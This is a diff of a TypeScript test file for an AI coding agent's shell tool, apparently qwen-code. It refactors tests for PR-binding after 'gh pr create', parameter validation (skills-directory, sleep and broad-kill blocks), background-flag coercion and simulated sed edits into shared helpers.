-      await runShell('gh pr create --fill || gh pr view --json url --jq .url', {
-        output: 'https://github.com/o/r/pull/42\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      fetchCurrentBranchPullRequestMock.mockResolvedValue(branchPr(42));
+      await runShell(CREATE_OR_VIEW, PR_42);
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not re-emit when the resolved PR is already bound', async () => {
-      // The pre-run snapshot missed the branch's PR (a gh flake before the
-      // run), so the resolution reaches persistence; the write reports the
-      // number alreadyBound, so nothing is re-stamped and no catalog
-      // notification fires.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 42,
-        url: 'https://github.com/o/r/pull/42',
-        state: 'open',
-        headRefName: 'main',
-      });
+      // The pre-run snapshot missed the PR (a gh flake), so the resolution
+      // reaches persistence; the write reports it alreadyBound, so nothing is
+      // re-stamped and no catalog notification fires.
+      mockCreatedPr(42);
       upsertSessionPrsMock.mockResolvedValue({
         prs: [],
         added: [],
         alreadyBound: [42],
         unresolved: [],
       });
-      await runShell('gh pr create --fill || gh pr view --json url --jq .url', {
-        output: 'https://github.com/o/r/pull/42\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      await runShell(CREATE_OR_VIEW, PR_42);
 
       expect(upsertSessionPrsMock).toHaveBeenCalledWith(
         '/test/proj/chats/test-session.pr.json',
-        [
-          {
-            number: 42,
-            url: 'https://github.com/o/r/pull/42',
-            state: 'open',
-            source: 'create',
-          },
-        ],
+        [{ ...prRecord(42), source: 'create' }],
       );
-      const sessionService = mockConfig.getSessionService() as unknown as {
-        emitSessionPrBound: ReturnType<typeof vi.fn>;
-      };
-      expect(sessionService.emitSessionPrBound).not.toHaveBeenCalled();
+      expect(sessionServiceMock().emitSessionPrBound).not.toHaveBeenCalled();
     });
 
     it('binds when a promote is refused after the command settled', async () => {
-      // The promote abort fires with kind 'background', but the child had
-      // already completed with exit 0 and full output — the run still goes
-      // through the binding gate.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
+      // The promote abort fires with kind 'background', but the child already
+      // completed with exit 0 and full output, so the binding gate still runs.
+      mockCreatedPr(77);
+      await runShell('gh pr create --fill', PR_77, 0, {
+        result: { aborted: true },
+        promote: (promoteAc) => promoteAc.abort({ kind: 'background' }),
       });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      const setPromoteAc = vi.fn();
-      const invocation = shellTool.build({
-        command: 'gh pr create --fill',
-        directory: '/test/dir',
-        is_background: false,
-      });
-      const resultPromise = (invocation as ShellToolInvocation).execute(
-        new AbortController().signal,
-        undefined,
-        {},
-        undefined,
-        setPromoteAc,
-      );
-      await vi.waitFor(() =>
-        expect(mockShellExecutionService).toHaveBeenCalled(),
-      );
-      const promoteAc = setPromoteAc.mock.calls[0][0] as AbortController;
-      promoteAc.abort({ kind: 'background' });
-      resolveExecutionPromise({
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: true,
-      } as ShellExecutionResult);
-      await resultPromise;
-      await new Promise((resolve) => setTimeout(resolve, 20));
 
-      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
-        '/test/proj/chats/test-session.pr.json',
-        [expect.objectContaining({ number: 77 })],
-      );
+      expectBound(77);
     });
 
     it('does not bind when a promote succeeds mid-run (documented scope)', async () => {
-      // A create promoted to the background settles through the registry:
-      // its output streams to a file and the foreground gate never sees
-      // it. Binding it is out of scope by design (see bindGhPrCreate).
-      vi.mocked(fs.writeFileSync).mockReturnValue(undefined);
-      // Only the pre-run snapshot is consumed: the post-run leg never runs.
+      // A promoted create settles through the registry (output streams to a
+      // file), so the foreground gate never sees it; out of scope by design
+      // (see bindGhPrCreate). Only the pre-run snapshot is consumed.
       fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
         status: 'none',
       });
-      const setPromoteAc = vi.fn();
-      const invocation = shellTool.build({
-        command: 'gh pr create --fill',
-        directory: '/test/dir',
-        is_background: false,
+      const result = await runShell('gh pr create --fill', PR_77, 0, {
+        result: { promoted: true, pid: 99999 },
+        promote: () => {},
       });
-      const resultPromise = (invocation as ShellToolInvocation).execute(
-        new AbortController().signal,
-        undefined,
-        {},
-        undefined,
-        setPromoteAc,
-      );
-      await vi.waitFor(() =>
-        expect(mockShellExecutionService).toHaveBeenCalled(),
-      );
-      resolveExecutionPromise({
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-        promoted: true,
-        pid: 99999,
-      } as ShellExecutionResult);
-      const result = await resultPromise;
-      await new Promise((resolve) => setTimeout(resolve, 20));
 
       expect(result.llmContent).toContain('promoted to background');
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind an is_background create (documented scope)', async () => {
-      // No pre-run snapshot is taken for a background run and its settle
-      // never reaches the gate — the documented limitation, pinned so a
-      // change to it is deliberate.
-      const invocation = shellTool.build({
-        command: 'gh pr create --fill',
+      // No pre-run snapshot is taken for a background run and its settle never
+      // reaches the gate: pinned so changing this limitation is deliberate.
+      const result = await build('gh pr create --fill', {
         directory: '/test/dir',
         is_background: true,
-      });
-      const result = await invocation.execute(new AbortController().signal);
+      }).execute(new AbortController().signal);
       resolveExecutionPromise({
-        output: 'https://github.com/o/r/pull/77\n',
+        output: PR_77,
         exitCode: 0,
         aborted: false,
       } as ShellExecutionResult);
       await new Promise((resolve) => setTimeout(resolve, 20));
 
       expect(result.llmContent).toContain('bg_');
-      expect(fetchCurrentBranchPullRequestMock).not.toHaveBeenCalled();
-      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
+      expectNotCalled(fetchCurrentBranchPullRequestMock, upsertSessionPrsMock);
     });
 
     it('does not bind when the command switched branches mid-run', async () => {
-      // A gate-passing compound that checks out another branch resolves the
-      // NEW branch's existing PR post-run (its view segment prints the URL
-      // and exits 0). The resolved head branch differs from the pre-run
-      // branch, so this run did not create it.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 9,
-        url: 'https://github.com/o/r/pull/9',
-        state: 'open',
-        headRefName: 'other-branch',
-      });
+      // A compound that checks out another branch resolves that branch's
+      // existing PR post-run; its head differs from the pre-run branch.
+      mockCreatedPr(9, { headRefName: 'other-branch' });
       await runShell(
         'git checkout other-branch && gh pr create --fill || gh pr view --json url --jq .url',
-        {
-          output: 'https://github.com/o/r/pull/9\n',
-          exitCode: 0,
-          aborted: false,
-        },
+        'https://github.com/o/r/pull/9\n',
       );
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
@@ -819,21 +918,8 @@ describe('ShellTool', () => {
       // Detached HEAD or a git failure leaves the pre-run branch unproven;
       // decline instead of binding whatever the post-run fetch resolves.
       fetchCurrentBranchNameMock.mockResolvedValueOnce(undefined);
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --fill', {
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      mockCreatedPr(77);
+      await runShell('gh pr create --fill', PR_77);
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
@@ -845,106 +931,50 @@ describe('ShellTool', () => {
       fetchAttributionRepoKeysMock.mockResolvedValueOnce({
         resolved: 'github.com/o/r',
       });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 5,
-        url: 'https://github.com/victim/other/pull/5',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --fill || gh pr view --json url --jq .url', {
-        output: 'https://github.com/victim/other/pull/5\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      mockCreatedPr(5, { url: 'https://github.com/victim/other/pull/5' });
+      await runShell(
+        CREATE_OR_VIEW,
+        'https://github.com/victim/other/pull/5\n',
+      );
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind when the pre-run repo identity could not be resolved', async () => {
-      // gh unable to answer which repo this checkout attributes to —
-      // decline like the errored-snapshot arm instead of binding anywhere.
+      // gh cannot say which repo this checkout attributes to: decline like
+      // the errored-snapshot arm instead of binding anywhere.
       fetchAttributionRepoKeysMock.mockResolvedValueOnce({});
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --fill', {
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      mockCreatedPr(77);
+      await runShell('gh pr create --fill', PR_77);
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('binds a fork-layout create attributed to the parent repo', async () => {
-      // From a fork checkout gh resolves PR operations to the PARENT repo,
-      // so a create legitimately made in this layout carries the parent's
-      // key — the fork-parent identity is part of the pre-run set.
+      // From a fork checkout gh resolves PR operations to the PARENT repo, so
+      // the fork-parent identity is part of the pre-run set.
       fetchAttributionRepoKeysMock.mockResolvedValueOnce({
         resolved: 'github.com/fork/r',
         parent: 'github.com/o/r',
       });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --fill', {
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      mockCreatedPr(77);
+      await runShell('gh pr create --fill', PR_77);
 
-      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
-        '/test/proj/chats/test-session.pr.json',
-        [expect.objectContaining({ number: 77 })],
-      );
+      expectBound(77);
     });
 
     it('writes the binding to the archived sidecar when the session was archived mid-run', async () => {
-      // An archive transition landing during the gh round-trip must not
-      // strand the binding on a resurrected active sidecar: the location is
-      // re-resolved immediately before the locked mutation.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      const sessionService = mockConfig.getSessionService() as unknown as {
-        getSessionLocation: unknown;
-        getPrSessionPathForArchiveState: ReturnType<typeof vi.fn>;
-      };
+      // An archive transition during the gh round-trip must not strand the
+      // binding on a resurrected active sidecar: the location is re-resolved
+      // immediately before the locked mutation.
+      mockCreatedPr(77);
+      const sessionService = sessionServiceMock();
       sessionService.getSessionLocation = vi.fn().mockResolvedValue('archived');
       sessionService.getPrSessionPathForArchiveState.mockImplementation(
         (_sessionId: string, state: string) =>
           `/test/proj/chats-${state}/test-session.pr.json`,
       );
-      await runShell('gh pr create --fill', {
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      await runShell('gh pr create --fill', PR_77);
 
       expect(upsertSessionPrsMock).toHaveBeenCalledWith(
         '/test/proj/chats-archived/test-session.pr.json',
@@ -968,39 +998,59 @@ describe('ShellTool', () => {
   });
 
   describe('build', () => {
+    const SKILLS_DIR_ERROR =
+      'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.';
+    const validate = (command: string) =>
+      shellTool.validateToolParams({ command, is_background: false });
+
     it('should return an invocation for a valid command', async () => {
-      const invocation = shellTool.build({
-        command: 'ls -l',
-        is_background: false,
-      });
-      expect(invocation).toBeDefined();
+      expect(build('ls -l')).toBeDefined();
     });
 
-    it('should throw an error for an empty command', async () => {
-      expect(() =>
-        shellTool.build({ command: ' ', is_background: false }),
-      ).toThrow('Command cannot be empty.');
+    it.each<[string, string, Partial<ShellToolParams>, string]>([
+      [
+        'should throw an error for an empty command',
+        ' ',
+        {},
+        'Command cannot be empty.',
+      ],
+      [
+        'should throw an error for a relative directory path',
+        'ls',
+        { directory: 'rel/path' },
+        'Directory must be an absolute path.',
+      ],
+      [
+        'should throw an error for a directory within the user skills directory',
+        'ls',
+        { directory: '/test/dir/.qwen/skills/my-skill' },
+        SKILLS_DIR_ERROR,
+      ],
+      [
+        'should throw an error for the user skills directory itself',
+        'ls',
+        { directory: '/test/dir/.qwen/skills' },
+        SKILLS_DIR_ERROR,
+      ],
+      [
+        'should resolve directory path before checking user skills directory',
+        'ls',
+        { directory: '/test/dir/.qwen/skills/../skills/my-skill' },
+        SKILLS_DIR_ERROR,
+      ],
+    ])('%s', async (_title, command, params, message) => {
+      expect(() => build(command, params)).toThrow(message);
     });
 
     it('should mention the intentional sleep escape hatch when blocking sleep', async () => {
-      const error = shellTool.validateToolParams({
-        command: 'sleep 5',
-        is_background: false,
-      });
-
-      expect(error).toContain('intentional-sleep:');
+      expect(validate('sleep 5')).toContain('intentional-sleep:');
     });
 
     it('should explain rejected intentional sleep comments', async () => {
-      const shortReasonError = shellTool.validateToolParams({
-        command: 'sleep 5 # intentional-sleep: wait',
-        is_background: false,
-      });
-      const overCapError = shellTool.validateToolParams({
-        command:
-          'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
-        is_background: false,
-      });
+      const shortReasonError = validate('sleep 5 # intentional-sleep: wait');
+      const overCapError = validate(
+        'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
+      );
 
       expect(shortReasonError).toContain('reason is too short');
       expect(shortReasonError).not.toContain('add a trailing comment like');
@@ -1009,12 +1059,9 @@ describe('ShellTool', () => {
     });
 
     it('should allow sleep with a valid intentional sleep comment', async () => {
-      const error = shellTool.validateToolParams({
-        command: 'sleep 5 # intentional-sleep: wait for MCP rate limit reset',
-        is_background: false,
-      });
-
-      expect(error).toBeNull();
+      expect(
+        validate('sleep 5 # intentional-sleep: wait for MCP rate limit reset'),
+      ).toBeNull();
     });
 
     it('should reject broad kill commands that can terminate qwen-code', async () => {
@@ -1023,190 +1070,65 @@ describe('ShellTool', () => {
         'killall node',
         'pkill -f qwen-code',
       ]) {
-        expect(() =>
-          shellTool.build({
-            command,
-            is_background: false,
-          }),
-        ).toThrow(
+        expect(() => build(command)).toThrow(
           'Blocked: this command may terminate the running qwen-code process',
         );
       }
     });
 
     it('should allow targeted process kills', async () => {
-      expect(
-        shellTool.validateToolParams({
-          command: 'taskkill /PID 1234 /F',
-          is_background: false,
-        }),
-      ).toBeNull();
-      expect(
-        shellTool.validateToolParams({
-          command: 'kill 1234',
-          is_background: false,
-        }),
-      ).toBeNull();
+      expect(validate('taskkill /PID 1234 /F')).toBeNull();
+      expect(validate('kill 1234')).toBeNull();
     });
 
     it('should guide model to split and use intentional-sleep for sleep chains', async () => {
-      const error = shellTool.validateToolParams({
-        command: 'sleep 5 && echo ok',
-        is_background: false,
-      });
+      const error = validate('sleep 5 && echo ok');
 
       expect(error).toContain('Split into two calls');
       expect(error).toContain('intentional-sleep:');
       expect(error).toContain('reason');
     });
 
-    it('should throw an error for a relative directory path', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: 'rel/path',
-          is_background: false,
-        }),
-      ).toThrow('Directory must be an absolute path.');
-    });
-
-    it('should throw an error for a directory outside the workspace', async () => {
-      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
-        createMockWorkspaceContext('/test/dir', ['/another/workspace']),
-      );
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: '/not/in/workspace',
-          is_background: false,
-        }),
-      ).toThrow(
-        "Directory '/not/in/workspace' is not within any of the registered workspace directories.",
-      );
-    });
-
-    it('should reject sibling-prefix directories outside the workspace', async () => {
-      const workspaceContext = createMockWorkspaceContext('/test/dir', [
-        '/tmp/project',
-      ]);
-      vi.mocked(workspaceContext.isPathWithinWorkspace).mockReturnValue(false);
-      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
-        workspaceContext,
-      );
-
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: '/tmp/project-other',
-          is_background: false,
-        }),
-      ).toThrow(
-        "Directory '/tmp/project-other' is not within any of the registered workspace directories.",
-      );
-      expect(workspaceContext.isPathWithinWorkspace).toHaveBeenCalledWith(
-        '/tmp/project-other',
-      );
-    });
-
-    it('should throw an error for a directory within the user skills directory', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: '/test/dir/.qwen/skills/my-skill',
-          is_background: false,
-        }),
-      ).toThrow(
-        'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.',
-      );
-    });
-
-    it('should throw an error for the user skills directory itself', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: '/test/dir/.qwen/skills',
-          is_background: false,
-        }),
-      ).toThrow(
-        'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.',
-      );
-    });
-
-    it('should resolve directory path before checking user skills directory', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: '/test/dir/.qwen/skills/../skills/my-skill',
-          is_background: false,
-        }),
-      ).toThrow(
-        'Explicitly running shell commands from within the user skills directory is not allowed. Please use absolute paths for command parameter instead.',
-      );
-    });
-
     it('should return an invocation for a valid absolute directory path', async () => {
       (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
         createMockWorkspaceContext('/test/dir', ['/another/workspace']),
       );
-      const invocation = shellTool.build({
-        command: 'ls',
-        directory: '/test/dir/subdir',
-        is_background: false,
-      });
-      expect(invocation).toBeDefined();
+      expect(build('ls', { directory: '/test/dir/subdir' })).toBeDefined();
     });
 
     it('should include background indicator in description when is_background is true', async () => {
-      const invocation = shellTool.build({
-        command: 'npm start',
-        is_background: true,
-      });
+      const invocation = build('npm start', { is_background: true });
       expect(invocation.getDescription()).toContain('[background]');
     });
 
     it('should not include background indicator in description when is_background is false', async () => {
-      const invocation = shellTool.build({
-        command: 'npm test',
-        is_background: false,
-      });
-      expect(invocation.getDescription()).not.toContain('[background]');
+      expect(build('npm test').getDescription()).not.toContain('[background]');
     });
 
     describe('is_background parameter coercion', () => {
-      it('should accept string "true" as boolean true', async () => {
-        const invocation = shellTool.build({
-          command: 'npm run dev',
-          is_background: 'true' as unknown as boolean,
+      it.each([
+        ['should accept string "true" as boolean true', 'npm run dev', 'true'],
+        [
+          'should accept string "false" as boolean false',
+          'npm run build',
+          'false',
+        ],
+        ['should accept string "True" as boolean true', 'npm run dev', 'True'],
+        [
+          'should accept string "False" as boolean false',
+          'npm run build',
+          'False',
+        ],
+      ])('%s', async (_title, command, flag) => {
+        const invocation = build(command, {
+          is_background: flag as unknown as boolean,
         });
         expect(invocation).toBeDefined();
-        expect(invocation.getDescription()).toContain('[background]');
-      });
-
-      it('should accept string "false" as boolean false', async () => {
-        const invocation = shellTool.build({
-          command: 'npm run build',
-          is_background: 'false' as unknown as boolean,
-        });
-        expect(invocation).toBeDefined();
-        expect(invocation.getDescription()).not.toContain('[background]');
-      });
-
-      it('should accept string "True" as boolean true', async () => {
-        const invocation = shellTool.build({
-          command: 'npm run dev',
-          is_background: 'True' as unknown as boolean,
-        });
-        expect(invocation).toBeDefined();
-        expect(invocation.getDescription()).toContain('[background]');
-      });
-
-      it('should accept string "False" as boolean false', async () => {
-        const invocation = shellTool.build({
-          command: 'npm run build',
-          is_background: 'False' as unknown as boolean,
-        });
-        expect(invocation).toBeDefined();
-        expect(invocation.getDescription()).not.toContain('[background]');
+        if (flag.toLowerCase() === 'true') {
+          expect(invocation.getDescription()).toContain('[background]');
+        } else {
+          expect(invocation.getDescription()).not.toContain('[background]');
+        }
       });
     });
   });
@@ -1217,54 +1139,320 @@ describe('ShellTool', () => {
     const resolveShellExecution = (
       result: Partial<ShellExecutionResult> = {},
     ) => {
-      const fullResult: ShellExecutionResult = {
-        rawOutput: Buffer.from(result.output || ''),
-        output: 'Success',
-        exitCode: 0,
-        signal: null,
-        error: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
-        ...result,
+      resolveExecutionPromise(
+        shellResult({
+          rawOutput: Buffer.from(result.output || ''),
+          output: 'Success',
+          ...result,
+        }),
+      );
+    };
+
+    /** Settles the pending spawn with `shellResult(result)`; returns `promise`. */
+    const settle = (
+      promise: Promise<ToolResult>,
+      result: Partial<ShellExecutionResult> = {},
+    ) => {
+      resolveExecutionPromise(shellResult(result));
+      return promise;
+    };
+
+    // Runs `command` in the foreground (`params` extend the build), optionally
+    // advancing fake time first, then settles it with `result`.
+    const runFg = async (
+      command: string,
+      result: Partial<ShellExecutionResult> = {},
+      {
+        advanceMs,
+        ...params
+      }: Partial<ShellToolParams> & { advanceMs?: number } = {},
+    ) => {
+      const promise = build(command, params).execute(mockAbortSignal);
+      if (advanceMs !== undefined) await vi.advanceTimersByTimeAsync(advanceMs);
+      resolveShellExecution(result);
+      return promise;
+    };
+
+    /** Runs `command` in the foreground to a clean exit; returns the command the service spawned. */
+    const spawnedCommand = async (
+      command: string,
+      { waitForSpawn = false } = {},
+    ) => {
+      const promise = build(command).execute(mockAbortSignal);
+      if (waitForSpawn) {
+        await vi.waitFor(() =>
+          expect(mockShellExecutionService).toHaveBeenCalled(),
+        );
+      }
+      await settle(promise);
+      return mockShellExecutionService.mock.calls[0][0] as string;
+    };
+
+    // Runs `git commit -m "x"` to exit 0 (with `output`) through the
+    // attachCommitAttribution note-failure branch: HEAD moves one commit over
+    // one AI-attributed file, then building the note payload throws `message`.
+    const commitWithNoteFailure = async (message: string, output = '') => {
+      const preSha = 'a'.repeat(40);
+      const postSha = 'b'.repeat(40);
+      // The note path's git probes go through childProcess.execFile.
+      mockExecFile.mockImplementation(
+        (
+          _file: unknown,
+          args: unknown,
+          _options: unknown,
+          callback: (
+            error: Error | null,
+            stdout: string,
+            stderr: string,
+          ) => void,
+        ) => {
+          const joined = (args as string[]).join(' ');
+          const respond =
+            joined === 'rev-parse HEAD'
+              ? `${postSha}\n`
+              : joined.startsWith('rev-list --count')
+                ? '1\n'
+                : null;
+          queueMicrotask(() =>
+            respond === null
+              ? callback(new Error(`unexpected git call: ${joined}`), '', '')
+              : callback(null, respond, ''),
+          );
+          return { on: vi.fn() };
+        },
+      );
+      // The diff analysis goes through the mocked service: the commit gets
+      // the deferred result, runGit probes get canned per-subcommand output.
+      const probes: Array<[flag: string, output: string]> = [
+        ['rev-parse --verify', `${preSha}\n`],
+        ['log -1 --pretty=%P', `${preSha}\n`],
+        ['rev-parse --show-toplevel', '/test/dir\n'],
+        ['--name-only', 'file.txt\n'],
+        ['--name-status', 'M\tfile.txt\n'],
+        ['--numstat', '1\t0\tfile.txt\n'],
+      ];
+      mockShellExecutionService.mockImplementation((cmd: string) => {
+        if (cmd.startsWith('git commit')) {
+          return {
+            pid: 12345,
+            result: new Promise<ShellExecutionResult>((resolve) => {
+              resolveExecutionPromise = resolve;
+            }),
+          };
+        }
+        const probeOutput =
+          probes.find(([flag]) => cmd.includes(flag))?.[1] ?? '';
+        return {
+          pid: 12345,
+          result: Promise.resolve(shellResult({ output: probeOutput })),
+        };
+      });
+      // Stub the attribution singleton so the commit has one AI-touched file
+      // (the mocked `crypto` breaks the real recordEdit's hashing), then make
+      // the note payload build throw so the catch branch warns.
+      const attributionService = CommitAttributionService.getInstance();
+      vi.spyOn(attributionService, 'hasAttributions').mockReturnValue(true);
+      vi.spyOn(attributionService, 'matchCommittedFiles').mockReturnValue(
+        new Set(['/test/dir/file.txt']),
+      );
+      vi.spyOn(attributionService, 'generateNotePayload').mockImplementation(
+        () => {
+          throw new Error(message);
+        },
+      );
+
+      const promise = build('git commit -m "x"').execute(mockAbortSignal);
+      await vi.waitFor(() =>
+        expect(mockShellExecutionService).toHaveBeenCalled(),
+      );
+      return settle(promise, { output });
+    };
+
+    /** `[title, command, expected]` table rows from a `{ title: command }` map. */
+    const rowsOf = <T>(expected: T, rows: Record<string, string>) =>
+      Object.entries(rows).map(([title, command]): [string, string, T] => [
+        title,
+        command,
+        expected,
+      ]);
+
+    /** Overrides the co-author config (commit and PR attribution on). */
+    const setCoAuthor = (name: string, email = 'bot@example.com') =>
+      (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
+        commit: true,
+        pr: true,
+        name,
+        email,
+      });
+
+    const runBg = (command: string) =>
+      build(command, { is_background: true }).execute(mockAbortSignal);
+
+    /** Starts `command` in the background, exits it with `result`, and returns its registry entry. */
+    const runBgToExit = async (
+      command: string,
+      result: Partial<ShellExecutionResult> = {},
+    ) => {
+      await runBg(command);
+      const entry = registeredEntry();
+      resolveExecutionPromise(shellResult(result));
+      // Flush the .then() microtask attached to resultPromise.
+      await new Promise((r) => setImmediate(r));
+      return entry;
+    };
+
+    /** Runs `command` in the foreground and settles it as promoted to the background. */
+    const runPromoted = (command: string, pid: number, output = '') => {
+      const promise = build(command).execute(mockAbortSignal);
+      resolveShellExecution({ output, exitCode: null, promoted: true, pid });
+      return promise;
+    };
+
+    /** Stubs process.kill (as `true`) until this test finishes. */
+    const spyKill = () => {
+      const spy = vi.spyOn(process, 'kill').mockImplementation(() => true);
+      onTestFinished(() => {
+        spy.mockRestore();
+      });
+      return spy;
+    };
+
+    // Installs a write stream for the next open; `finish` fires as soon as
+    // awaited (the PR-2.5 settle path waits on it before transitioning).
+    const installWriteStream = (overrides: Record<string, Mock> = {}) => {
+      const stream = {
+        write: vi.fn(),
+        end: vi.fn(),
+        on: vi.fn(),
+        once: vi.fn((event: string, handler: () => void) => {
+          if (event === 'finish') handler();
+        }),
+        ...overrides,
       };
-      resolveExecutionPromise(fullResult);
+      vi.mocked(fs.createWriteStream).mockReturnValueOnce(
+        stream as unknown as fs.WriteStream,
+      );
+      return stream;
+    };
+
+    /** The onSettle hook the foreground run handed to the service. */
+    const spawnedOnSettle = () =>
+      (
+        mockShellExecutionService.mock.calls[0][6] as {
+          postPromote: Required<PostPromote>;
+        }
+      ).postPromote.onSettle;
+
+    // Makes the next spawn resolve as promoted, first handing its post-promote
+    // hooks to `onSpawn`; returns a getter for those hooks.
+    const mockPromotedSpawn = (
+      pid: number,
+      output: string,
+      onSpawn: (postPromote: PostPromote | undefined) => void = () => {},
+    ) => {
+      let captured: PostPromote | undefined;
+      mockShellExecutionService.mockImplementationOnce((...args: unknown[]) => {
+        captured = (args[6] as { postPromote?: PostPromote } | undefined)
+          ?.postPromote;
+        onSpawn(captured);
+        return {
+          pid,
+          result: Promise.resolve(
+            shellResult({ output, exitCode: null, promoted: true, pid }),
+          ),
+        };
+      });
+      return () => captured;
     };
 
     describe('simulated sed edit', () => {
       const expectedSedFilePath = path.resolve('/test/dir', 'file.txt');
+      const SED = "sed -i 's/foo/bar/' file.txt";
+      const buildSed = (command = SED, params: Partial<ShellToolParams> = {}) =>
+        build(command, { directory: '/test/dir', ...params });
+      const sedMeta = () => ({
+        bom: false,
+        encoding: 'utf-8',
+        lineEnding: 'lf',
+      });
+      /** A readTextFile result for the sed target. */
+      const sedFile = (content = 'foo\n') => ({ content, _meta: sedMeta() });
+      /** The writeTextFile call a simulated sed edit makes. */
+      const sedWrite = (content: string) => ({
+        path: expectedSedFilePath,
+        content,
+        toolWriteOrigin: 'shell_sed_edit',
+        _meta: sedMeta(),
+      });
+
+      /** The confirmation details, asserted to be an edit preview. */
+      const editDetails = async (
+        invocation: ToolInvocation<ShellToolParams, ToolResult>,
+        signal = mockAbortSignal,
+      ) => {
+        const details = await invocation.getConfirmationDetails(signal);
+        expect(details.type).toBe('edit');
+        if (details.type !== 'edit') {
+          throw new Error('expected edit confirmation');
+        }
+        return details;
+      };
 
       const confirmSedEdit = async (
         invocation: ToolInvocation<ShellToolParams, ToolResult>,
-      ) => {
+        signal = mockAbortSignal,
+      ) =>
+        (await editDetails(invocation, signal)).onConfirm(
+          ToolConfirmationOutcome.ProceedOnce,
+        );
+
+      /** Answers the confirmation with `outcome` (no preview-type check). */
+      const confirmWith = async (
+        invocation: ToolInvocation<ShellToolParams, ToolResult>,
+        outcome = ToolConfirmationOutcome.ProceedOnce,
+        payload?: { newContent: string },
+      ) =>
+        (await invocation.getConfirmationDetails(mockAbortSignal)).onConfirm(
+          outcome,
+          payload,
+        );
+
+      /** Asserts no shell spawned and no backup or write happened. */
+      const expectSedSkipped = () =>
+        expectNotCalled(
+          mockShellExecutionService,
+          mockFileHistoryService.trackEdit,
+          mockFileSystemService.writeTextFile,
+        );
+
+      /** Builds a sed invocation, accepts its edit preview, and executes it. */
+      const applySed = async (command = SED) => {
+        const invocation = buildSed(command);
+        await confirmSedEdit(invocation);
+        return invocation.execute(mockAbortSignal);
+      };
+
+      /** Previews `command`, starts executing it, and asserts a raw exec preview. */
+      const previewExec = async (command = SED) => {
+        const invocation = buildSed(command);
         const details =
           await invocation.getConfirmationDetails(mockAbortSignal);
-        expect(details.type).toBe('edit');
-        if (details.type !== 'edit') {
-          throw new Error('expected edit confirmation');
-        }
-        await details.onConfirm(ToolConfirmationOutcome.ProceedOnce);
+        const resultPromise = invocation.execute(mockAbortSignal);
+        expect(details.type).toBe('exec');
